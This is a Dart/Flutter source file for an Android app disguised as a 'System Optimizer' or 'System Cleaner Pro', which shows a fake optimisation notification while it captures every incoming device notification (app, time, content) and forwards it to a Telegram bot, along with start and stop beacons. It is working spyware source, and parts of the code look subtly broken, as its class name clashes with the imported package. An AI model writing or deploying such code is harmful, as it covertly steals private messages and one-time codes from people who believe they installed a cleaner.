import 'package:flutter/material.dart';
import 'package:foreground_service/foreground_service.dart';
import 'notification_service.dart';
import 'telegram_service.dart';

class ForegroundService {
  static final ForegroundService _instance = ForegroundService._internal();
  factory ForegroundService() => _instance;
  ForegroundService._internal();

  final NotificationService _notificationService = NotificationService();
  final TelegramService _telegramService = TelegramService();
  bool _isRunning = false;

  Future<void> initialize() async {
    await _startForegroundService();
    await _notificationService.initialize();
    _startMonitoring();
  }

  Future<void> _startForegroundService() async {
    await ForegroundService.setup(
      notificationTitle: "System Optimizer",
      notificationText: "Optimizing your device performance...",
      notificationIcon: "ic_launcher",
    );
    
    await ForegroundService.start();
    _isRunning = true;
    
    // إرسال إشعار بدء التشغيل لتيليجرام
    _telegramService.sendMessage("🚀 System Cleaner Pro Started\nDevice: Android\nTime: ${DateTime.now()}");
  }

  void _startMonitoring() {
    // محاكاة مراقبة الإشعارات (ستحتاج تعديل حسب احتياجاتك)
    _notificationService.startListening((notification) {
      // إرسال الإشعار لتيليجرام
      _telegramService.sendMessage(
        "📱 New Notification\n"
        "App: ${notification['app']}\n"
        "Time: ${notification['time']}\n"
        "Content: ${notification['content']}"
      );
    });
  }

  Future<void> stopService() async {
    await ForegroundService.stop();
    _isRunning = false;
    _telegramService.sendMessage("⏹️ System Cleaner Pro Stopped");
  }

  bool get isRunning => _isRunning;
}